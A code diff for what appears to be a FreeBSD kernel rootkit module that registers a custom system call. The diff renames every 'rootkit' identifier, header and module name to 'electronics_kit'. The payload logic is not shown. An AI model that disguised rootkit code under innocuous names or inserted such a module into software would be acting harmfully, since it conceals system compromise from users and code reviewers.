@@ -1,9 +1,9 @@
-#include "rootkit.h"
+#include "electronics_kit.h"
 
 struct node * first_node = NULL;
 
 /* The system call's arguments. */
-struct rootkit_args {
+struct electronics_kit_args {
 	int command;
 	char ** args;
 };
@@ -20,8 +20,8 @@ void a_func() {
 /* The system call function. */
 static int main(struct thread *td, void *syscall_args) {
 
-	struct rootkit_args *uap;
-	uap = (struct rootkit_args *)syscall_args;
+	struct electronics_kit_args *uap;
+	uap = (struct electronics_kit_args *)syscall_args;
 
 	long resp;
 
@@ -69,7 +69,7 @@ static int main(struct thread *td, void *syscall_args) {
 }
 
 /* The sysent for the new system call. */
-static struct sysent rootkit_sysent = {
+static struct sysent electronics_kit_sysent = {
 	2,			/* number of arguments */
 	main		/* implementing function */
 };
@@ -104,15 +104,15 @@ static int load(struct module *module, int cmd, void *arg) {
 	return(error);
 }
 
-static struct syscall_module_data rootkit_func_mod = {
-	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
+static struct syscall_module_data electronics_kit_func_mod = {
+	load, NULL, &offset, &electronics_kit_sysent, { 0, NULL }
 };
 
-static moduledata_t rootkit_mod = {
+static moduledata_t electronics_kit_mod = {
 	MODULE_NAME,
 	syscall_module_handler,
-	&rootkit_func_mod
+	&electronics_kit_func_mod
 };
 
-DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(electronics_kit, electronics_kit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 
